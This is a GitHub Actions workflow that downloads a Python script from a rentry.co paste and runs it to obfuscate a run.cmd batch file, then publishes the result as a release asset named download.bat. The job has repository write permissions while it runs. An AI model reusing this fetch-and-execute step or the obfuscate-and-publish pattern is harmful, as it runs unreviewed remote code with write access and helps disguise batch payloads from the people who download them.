name: Obfuscate File and Upload

on:
  push:
    paths:
      - 'run.cmd'

jobs:
  obfuscate:
    runs-on: windows-latest
    permissions:
      contents: write
      pull-requests: write
      repository-projects: write
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Download main.py
        run: |
          Invoke-WebRequest -Uri https://rentry.co/6artz93e/raw -OutFile main.py

      - name: Obfuscate run.cmd
        run: |
          python main.py

      - name: Delete-tag-and-release
        uses: dev-drprasad/delete-tag-and-release@v1.1
        with:
          tag_name: AutoBuild
          delete_release: true
          github_token: ${{ secrets.GITHUB_TOKEN }}

      - name: Create Release
        id: create_release
        uses: actions/create-release@latest
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: AutoBuild
          release_name: AutoBuild
          body: Obfuscated run.cmd file
          draft: false
          prerelease: false

      - name: Upload Release Asset
        id: upload-release-asset 
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }}
          asset_path: run-obf.bat
          asset_name: download.bat
          asset_content_type: application/octet-stream
